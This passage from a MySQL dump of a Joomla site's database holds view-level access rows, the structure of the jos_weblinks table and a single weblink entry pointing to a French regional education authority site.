INSERT INTO `jos_viewlevels` (`id`, `title`, `ordering`, `rules`) VALUES
(1, 'Public', 0, '[1]'),
(2, 'Registered', 1, '[6,2,8]'),
(3, 'Special', 2, '[6,3,8]');

-- --------------------------------------------------------

--
-- Table structure for table `jos_weblinks`
--

CREATE TABLE IF NOT EXISTS `jos_weblinks` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `catid` int(11) NOT NULL DEFAULT '0',
  `sid` int(11) NOT NULL DEFAULT '0',
  `title` varchar(250) NOT NULL DEFAULT '',
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `url` varchar(250) NOT NULL DEFAULT '',
  `description` text NOT NULL,
  `date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `hits` int(11) NOT NULL DEFAULT '0',
  `state` tinyint(1) NOT NULL DEFAULT '0',
  `checked_out` int(11) NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `archived` tinyint(1) NOT NULL DEFAULT '0',
  `approved` tinyint(1) NOT NULL DEFAULT '1',
  `access` int(11) NOT NULL DEFAULT '1',
  `params` text NOT NULL,
  `language` char(7) NOT NULL DEFAULT '',
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_by` int(10) unsigned NOT NULL DEFAULT '0',
  `created_by_alias` varchar(255) NOT NULL DEFAULT '',
  `modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_by` int(10) unsigned NOT NULL DEFAULT '0',
  `metakey` text NOT NULL,
  `metadesc` text NOT NULL,
  `metadata` text NOT NULL,
  `featured` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT 'Set if link is featured.',
  `xreference` varchar(50) NOT NULL COMMENT 'A reference to enable linkages to external data sets.',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `idx_access` (`access`),
  KEY `idx_checkout` (`checked_out`),
  KEY `idx_state` (`state`),
  KEY `idx_catid` (`catid`),
  KEY `idx_createdby` (`created_by`),
  KEY `idx_featured_catid` (`featured`,`catid`),
  KEY `idx_language` (`language`),
  KEY `idx_xreference` (`xreference`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `jos_weblinks`
--

INSERT INTO `jos_weblinks` (`id`, `catid`, `sid`, `title`, `alias`, `url`, `description`, `date`, `hits`, `state`, `checked_out`, `checked_out_time`, `ordering`, `archived`, `approved`, `access`, `params`, `language`, `created`, `created_by`, `created_by_alias`, `modified`, `modified_by`, `metakey`, `metadesc`, `metadata`, `featured`, `xreference`, `publish_up`, `publish_down`) VALUES
(1, 6, 0, 'DSDEN 94', 'dsden94', 'http://www.ia94.ac-creteil.fr/', '', '0000-00-00 00:00:00', 0, 1, 0, '0000-00-00 00:00:00', 1, 0, 1, 1, '{"target":"1","width":"","height":"","count_clicks":""}', '*', '2016-06-08 12:18:32', 390, '', '2016-06-09 07:24:27', 390, '', '', '{"robots":"","rights":""}', 0, '', '0000-00-00 00:00:00', '0000-00-00 00:00:00');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
